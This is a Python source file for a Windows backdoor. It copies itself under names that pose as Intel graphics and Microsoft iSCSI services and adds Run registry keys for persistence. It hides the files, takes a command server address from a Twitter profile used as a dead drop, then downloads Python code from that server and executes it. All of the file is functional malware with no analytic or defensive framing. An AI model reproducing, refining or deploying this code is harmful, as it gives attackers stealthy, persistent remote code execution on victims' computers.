
# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import ast
import sys
import os
import platform
from ctypes.wintypes import MSG
from ctypes import wintypes, windll
import ctypes
import threading
import subprocess
import sched
import datetime
import zlib
import base64
import urllib
import shutil

url_list = ['https://mobile.twitter.com/ModeratorCanada',]
ACTIVE = False
_SHGetFolderPath = windll.shell32.SHGetFolderPathW
_SHGetFolderPath.argtypes = [wintypes.HWND, ctypes.c_int, wintypes.HANDLE, wintypes.DWORD, wintypes.LPCWSTR]
path_buf = wintypes.create_unicode_buffer(wintypes.MAX_PATH)
result = _SHGetFolderPath(0, 35, 0, 0, path_buf)
destination_folder = os.path.join(path_buf.value, 'Intel')
updater_folder = os.path.join(path_buf.value, 'Microsoft iSCSI Initiator')
if not os.path.exists(destination_folder):
    os.makedirs(destination_folder)
if not os.path.exists(updater_folder):
    os.makedirs(updater_folder)
destination_path = os.path.join(destination_folder, 'igfxsrvc.exe')
updater_path = os.path.join(updater_folder, 'msisci.exe')
file_name = sys.argv[0]
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
if not 'igfxsrvc' in file_name:
    if not os.path.exists(destination_path):
        shutil.copy2(file_name, destination_path)
    if not os.path.exists(updater_path):
        shutil.copy2(file_name, updater_path)
    if windll.shell32.IsUserAnAdmin() == 1:
        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "1Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
        subprocess.call(reg_payload, startupinfo=si)
        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('2Microsoft iSCSI Initiator Service', updater_path)
        subprocess.call(reg_payload, startupinfo=si)
    else:
        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "3Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
        subprocess.call(reg_payload, startupinfo=si)
        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('4Microsoft iSCSI Initiator Service', updater_path)
        subprocess.call(reg_payload, startupinfo=si)

    attrib_payload = r'attrib +h +s %s' % destination_path
    subprocess.call(attrib_payload, startupinfo=si)
    sys.exit(0)
else:
    if not os.path.exists(updater_path):
        shutil.copy2(file_name, updater_path)
    if not os.path.exists(destination_path):
        shutil.copy2(file_name, destination_path)
    if windll.shell32.IsUserAnAdmin() == 1:
        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "5Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
        subprocess.call(reg_payload, startupinfo=si)
        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('6Microsoft iSCSI Initiator Service', updater_path)
        subprocess.call(reg_payload, startupinfo=si)
    else:
        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "7Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
        subprocess.call(reg_payload, startupinfo=si)
        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format('8Microsoft iSCSI Initiator Service', updater_path)
        subprocess.call(reg_payload, startupinfo=si)

    attrib_payload = r'attrib +h +s %s' % destination_path
    subprocess.call(attrib_payload, startupinfo=si)
while 1:
    try:
        for url in url_list:
            try:
                req = urllib.urlopen(url).read()
                start = req.index('#!#!#!') + 6; end = req.index('#?#?#?')
                HOST, PORT = req[start:end].split(':')
                break
            except:
                continue
        GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        GLOBAL_SOCKET.connect((HOST, int(PORT)))
        GLOBAL_SOCKET.recv(1024)
        GLOBAL_SOCKET.sendall(str({'mode': 'buildClient', 'from': 'client', 'payload': '', 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
        received_data = ''
        payload = GLOBAL_SOCKET.recv(1024)
        while payload:
            received_data = received_data + payload
            if received_data.endswith('[ENDOFSOURCE]'):
                received_data = received_data[:-len('[ENDOFSOURCE]')]
                break
            else:
                payload = GLOBAL_SOCKET.recv(1024)
                continue
        try:
            ACTIVE = True

            # TODO: SOURCE
            exec received_data
            # TODO: END SOURCE

        except Exception as e:
            ACTIVE = False
            GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
            GLOBAL_SOCKET.close()
            del GLOBAL_SOCKET
            time.sleep(6)
    except socket.error as e:
        # TODO: TIMOUT
        time.sleep(5)